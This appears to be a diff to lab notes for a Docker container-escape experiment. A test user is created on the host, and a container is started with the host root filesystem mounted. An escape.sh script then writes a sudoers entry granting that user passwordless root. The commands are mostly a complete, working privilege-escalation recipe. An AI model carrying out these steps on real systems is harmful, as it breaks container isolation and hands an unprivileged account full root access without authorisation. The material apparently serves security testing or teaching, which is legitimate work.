@@ -60,6 +60,10 @@ stress 2 20
 #=================================================#
 # CONTAINER ESCAPE B
 #=================================================#
+
+# First pull the latest alpine image, we will create child of this image
+docker pull alpine
+
 # Create container from alpine image
 FROM alpine
 ENV WORKDIR /privesc
@@ -68,11 +72,24 @@ VOLUME $WORKDIR
 WORKDIR $WORKDIR
 
 # Command to build container
-docker build -t priv-container .
+docker build -t alpine_volume_privesc .
+
+# Start container so we can make the escape.sh 
+docker run --name ESCAPE_B --rm -it alpine_volume_privesc /bin/sh
+
+
+# Create testuser on the host, make sure already in sudo group
+# This just means testuser can sudo but still has to enter password
+sudo useradd testuser -G sudo
+# need to set password, simply use "user", need for testing password-less sudo
+sudo passwd testuser 
+# The user can sudo but must enter password first, e.g.
+# su testuser
+# sudo cat /etc/passwd  (should prompt for password the first time, will cache)
 
 
 # Command to run container, was /bin/bash
-docker run --name ESCAPE_B -v /:/privesc -it priv-container /bin/sh
+docker run --name ESCAPE_B -v /:/privesc -it alpine_volume_privesc /bin/sh
 
 #=================================================#
 # CONTAINER ATTACK B
@@ -81,13 +98,18 @@ echo "testuser ALL=(ALL) NOPASSWD: ALL" > /privesc/etc/sudoers.d/010_testuser-no
 
 
 
-## NB: To create the escape.sh
-/privesc # echo "#!/bin/sh" > escape.sh
-/privesc # echo "echo \"testuser ALL=(ALL) NOPASSWD: ALL\" > /privesc/etc/sudoers.d/010_testuser-nopasswd" >> escape.sh
+## NB: To create the escape.sh, be careful, the /privesc is not commited
+/privesc # cd ..
+# echo "#!/bin/sh" > escape.sh
+# echo "echo \"testuser ALL=(ALL) NOPASSWD: ALL\" > /privesc/etc/sudoers.d/010_testuser-nopasswd" >> escape.sh
+# chmod +x escape.sh
 
 ## The final file should look as follows
 #!/bin/sh
 echo "testuser ALL=(ALL) NOPASSWD: ALL" > /privesc/etc/sudoers.d/010_testuser-nopasswd
+
+# Need to save the container, from another terminal
+docker commit ESCAPE_B alpine_volume_privesc
 
 
 ## To execute
